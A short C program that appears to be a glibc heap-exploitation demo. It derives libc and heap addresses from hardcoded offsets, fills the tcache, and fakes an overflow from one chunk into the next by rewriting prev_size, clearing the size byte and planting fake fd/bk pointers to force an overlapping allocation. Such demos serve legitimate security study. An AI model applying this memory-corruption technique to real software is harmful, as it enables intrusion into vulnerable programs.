#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x6dfe0;
    size_t* mp_72=libc_addr+0x3af2c8;
    size_t heap=*mp_72;
    return heap;
}

int main()
{    
    int id;
    

    size_t heapbase=getheap();
    char* chunkarray[0x10];

    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x70);
    }
    char* chunk1=malloc(0x70);
    char* chunk2=malloc(0x80);
    char* chunk3=malloc(0x100);
    malloc(0x10);
   
    for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }

    free(chunk1);  // into fastbin
    *(size_t*)(chunk3-16)=0x90;  // chunk 2 overflow chunk3 prev_size
    *(char*)(chunk3-8)=0; //chunk2 overflow  chunk3 size 
    *(size_t*)chunk2=heapbase+0xa60; // fake chunk fd
    *(size_t*)(chunk2+8)=heapbase+0xa60;  //fake chunk bk
    
    scanf("%d",&id);
    
    char* chunk4=malloc(0x100);

    printf("chunk2 data begin %p \n",chunk2);

    printf("&chunk5[0x80] %p \n",&chunk4[0x80]);
}